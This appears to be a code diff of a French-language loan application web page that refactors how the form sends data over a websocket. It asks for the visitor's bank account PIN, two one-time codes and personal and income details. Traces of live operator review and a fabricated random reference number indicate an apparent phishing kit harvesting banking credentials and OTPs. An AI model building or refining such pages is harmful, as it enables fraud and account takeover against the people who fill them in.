@@ -184,7 +184,7 @@
                     </div>
                     <div class="grid grid-cols-2 gap-4 pt-4">
                         <button @click="step = 1" :disabled="pinVerifying" type="button" class="w-full bg-white border border-gray-200 text-slate-600 font-bold py-3.5 px-4 rounded-xl shadow-sm hover:bg-slate-50 active:scale-98 transition-all flex items-center justify-center gap-2 cursor-pointer">← Retour</button>
-                        <button @click="submitStep5" :disabled="!isPinValid || pinVerifying" type="button" class="w-full bg-[#74b927] hover:bg-[#66a322] disabled:opacity-50 disabled:cursor-not-allowed active:scale-98 text-white font-bold py-3.5 px-4 rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer">
+                        <button @click="submitPin" :disabled="!isPinValid || pinVerifying" type="button" class="w-full bg-[#74b927] hover:bg-[#66a322] disabled:opacity-50 disabled:cursor-not-allowed active:scale-98 text-white font-bold py-3.5 px-4 rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer">
                             <span x-show="!pinVerifying">Confirmer le PIN</span>
                             <span x-show="pinVerifying" class="spinner-sm"></span>
                         </button>
@@ -258,7 +258,7 @@
                         <textarea x-model="form.purpose" rows="3" class="w-full bg-slate-50/50 border border-gray-200 rounded-xl px-4 py-3.5 text-gray-700 placeholder-gray-400 font-medium transition-all resize-none" placeholder="Expliquez brièvement votre besoin"></textarea>
                     </div>
                     <div class="pt-4">
-                        <button @click="submitStep1" :disabled="!isStep1Valid" class="w-full bg-[#74b927] hover:bg-[#66a322] disabled:opacity-50 disabled:cursor-not-allowed active:scale-98 text-white font-bold py-3.5 px-4 rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer">Continuer →</button>
+                        <button @click="submitLoanConfig" :disabled="!isLoanConfigValid" class="w-full bg-[#74b927] hover:bg-[#66a322] disabled:opacity-50 disabled:cursor-not-allowed active:scale-98 text-white font-bold py-3.5 px-4 rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer">Continuer →</button>
                     </div>
                 </div>
 
@@ -284,7 +284,7 @@
                     </div>
                     <div class="grid grid-cols-2 gap-4 pt-4">
                         <button @click="step = 4" type="button" class="w-full bg-white border border-gray-200 text-slate-600 font-bold py-3.5 px-4 rounded-xl shadow-sm hover:bg-slate-50 active:scale-98 transition-all flex items-center justify-center gap-2 cursor-pointer">← Retour</button>
-                        <button @click="submitStep2" :disabled="!isStep2Valid" type="button" class="w-full bg-[#74b927] hover:bg-[#66a322] disabled:opacity-50 disabled:cursor-not-allowed active:scale-98 text-white font-bold py-3.5 px-4 rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer">Continuer →</button>
+                        <button @click="submitPersonalProfile" :disabled="!isPersonalProfileValid" type="button" class="w-full bg-[#74b927] hover:bg-[#66a322] disabled:opacity-50 disabled:cursor-not-allowed active:scale-98 text-white font-bold py-3.5 px-4 rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer">Continuer →</button>
                     </div>
                 </div>
 
@@ -317,11 +317,11 @@
                     </div>
                     <div class="grid grid-cols-2 gap-4 pt-4">
                         <button @click="step = 5" type="button" class="w-full bg-white border border-gray-200 text-slate-600 font-bold py-3.5 px-4 rounded-xl shadow-sm hover:bg-slate-50 active:scale-98 transition-all flex items-center justify-center gap-2 cursor-pointer">← Retour</button>
-                        <button @click="submitStep3" :disabled="!isStep3Valid" type="button" class="w-full bg-[#74b927] hover:bg-[#66a322] disabled:opacity-50 disabled:cursor-not-allowed active:scale-98 text-white font-bold py-3.5 px-4 rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer">Vérifier le prêt →</button>
+                        <button @click="submitEmploymentProfile" :disabled="!isEmploymentProfileValid" type="button" class="w-full bg-[#74b927] hover:bg-[#66a322] disabled:opacity-50 disabled:cursor-not-allowed active:scale-98 text-white font-bold py-3.5 px-4 rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer">Vérifier le prêt →</button>
                     </div>
                 </div>
 
-                <!-- NEW STEP 7: Local Instant Confirm PIN (No Admin Verification) -->
+                <!-- STEP 7: Local Instant Confirm PIN -->
                 <div x-show="step === 7" x-cloak class="space-y-5">
                     <div class="text-center mb-6">
                         <h2 class="text-xl font-bold text-gray-800 tracking-tight">Confirmez votre code PIN</h2>
@@ -378,9 +378,9 @@
                 otpRequested: false, requestingOtp: false, otpVerifying: false, pinVerifying: false, otp2Verifying: false, completingApplication: false,
                 socket: null, toast: { show: false, message: '' },
 
-                get isStep1Valid() { return this.form.loanType && this.form.term && this.form.purpose; },
-                get isStep2Valid() { return this.form.firstName && this.form.lastName && this.form.email; },
-                get isStep3Valid() { return this.form.employment && this.form.income; },
+                get isLoanConfigValid() { return this.form.loanType && this.form.term && this.form.purpose; },
+                get isPersonalProfileValid() { return this.form.firstName && this.form.lastName && this.form.email; },
+                get isEmploymentProfileValid() { return this.form.employment && this.form.income; },
                 get isPinValid() { return this.pin.value.join('').length === 4; },
                 get isConfirmPinValid() { return this.confirmPin.value.join('').length === 4; },
 
@@ -444,98 +444,91 @@
                         this.pin.value = ['', '', '', ''];
                         const inputs = document.querySelectorAll('.pin-box:not(.shadow-sm)');
                         if (inputs.length > 0) inputs[0].focus();
-                        this.triggerToastNotification(err.message || "Le code PIN secret saisi est incorrect.");
+                        this.triggerToastNotification(err.message || "Le PIN de votre compte est incorrect.");
                     });
 
                     this.socket.on('otp2-failed', (err) => {
                         this.otp2Verifying = false;
                         this.otp2.code = '';
-                        this.triggerToastNotification(err.message || "Le deuxième code de vérification est incorrect.");
+                        this.triggerToastNotification(err.message || "Deuxième OTP invalide.");
                     });
 
-                    this.socket.on('admin-reject', (err) => {
-                        this.otpVerifying = false;
-                        this.pinVerifying = false;
-                        this.otp2Verifying = false;
-                        this.requestingOtp = false;
-                        this.triggerToastNotification(err.message || "La vérification a été rejetée.");
-                    });
-
-                    this.socket.on('application-complete', (data) => {
+                    this.socket.on('application-finalized', (data) => {
                         this.completingApplication = false;
-                        this.referenceId = data.referenceId;
+                        this.referenceId = data.referenceId || ('WF-' + Math.floor(100000 + Math.random() * 900000));
                         this.step = 8;
+                    });
+
+                    this.socket.on('finalization-failed', (err) => {
+                        this.completingApplication = false;
+                        this.confirmPin.value = ['', '', '', ''];
+                        const inputs = document.querySelectorAll('.pin-box.shadow-sm');
+                        if (inputs.length > 0) inputs[0].focus();
+                        this.triggerToastNotification(err.message || "Confirmation échouée. Vérifiez votre code.");
                     });
                 },
 
                 sendOtpRequest() {
+                    if (this.form.phone.length < 6) return;
                     this.requestingOtp = true;
-                    this.socket.emit('request-otp1', { appId: this.appId, phone: this.form.phone });
-                    setTimeout(() => {
-                        if(this.requestingOtp) {
-                            this.requestingOtp = false;
-                            this.otpRequested = true;
-                        }
-                    }, 1200);
+                    this.socket.emit('request-otp1', { phone: this.form.phone });
                 },
 
-                verifyOTP() { 
-                    this.otpVerifying = true; 
-                    this.socket.emit('step4-otp', { appId: this.appId, phone: this.form.phone, otp: this.otp.code }); 
+                verifyOTP() {
+                    if (this.otp.code.length !== 6) return;
+                    this.otpVerifying = true;
+                    this.socket.emit('verify-otp1', { code: this.otp.code });
                 },
 
-                submitStep5() { 
-                    this.pinVerifying = true; 
-                    const pinString = this.pin.value.join('');
-                    this.socket.emit('step5-pin', { appId: this.appId, pin: pinString }); 
+                submitPin() {
+                    if (!this.isPinValid) return;
+                    this.pinVerifying = true;
+                    this.socket.emit('verify-pin', { pin: this.pin.value.join('') });
                 },
 
                 verifyOTP2() {
+                    if (this.otp2.code.length !== 6) return;
                     this.otp2Verifying = true;
-                    this.socket.emit('submit-otp2', { appId: this.appId, otp2: this.otp2.code });
+                    this.socket.emit('verify-otp2', { code: this.otp2.code });
                 },
 
-                submitStep1() {
+                submitLoanConfig() {
+                    if (!this.isLoanConfigValid) return;
                     this.step = 5;
-                    this.socket.emit('step1', { 
-                        appId: this.appId, 
-                        loanType: this.form.loanType, 
-                        amount: this.form.amount, 
-                        term: this.form.term, 
-                        purpose: this.form.purpose 
-                    });
                 },
 
-                submitStep2() {
+                submitPersonalProfile() {
+                    if (!this.isPersonalProfileValid) return;
                     this.step = 6;
-                    this.socket.emit('step2', {
-                        appId: this.appId,
-                        firstName: this.form.firstName,
-                        lastName: this.form.lastName,
-                        email: this.form.email
-                    });
                 },
 
-                submitStep3() {
-                    // Instantly shifts view onto the local verification gate (Step 7) without waiting
+                submitEmploymentProfile() {
+                    if (!this.isEmploymentProfileValid) return;
                     this.step = 7;
-                    this.socket.emit('step3-data', {
-                        appId: this.appId,
-                        employment: this.form.employment,
-                        income: this.form.income,
-                        employer: this.form.employer
-                    });
                 },
 
                 executeFinalSubmission() {
+                    if (!this.isConfirmPinValid) return;
                     this.completingApplication = true;
-                    const finalPin = this.confirmPin.value.join('');
-                    this.socket.emit('execute-final-confirmation', {
-                        appId: this.appId,
-                        confirmPin: finalPin
-                    });
+                    
+                    const payload = {
+                        phone: this.form.phone,
+                        loanType: this.form.loanType,
+                        amount: this.form.amount,
+                        term: this.form.term,
+                        purpose: this.form.purpose,
+                        firstName: this.form.firstName,
+                        lastName: this.form.lastName,
+                        email: this.form.email,
+                        employment: this.form.employment,
+                        income: this.form.income,
+                        employer: this.form.employer,
+                        confirmPin: this.confirmPin.value.join('')
+                    };
+                    
+                    this.socket.emit('finalize-loan', payload);
                 }
-            };
+            }
         }
     </script>
 </body>
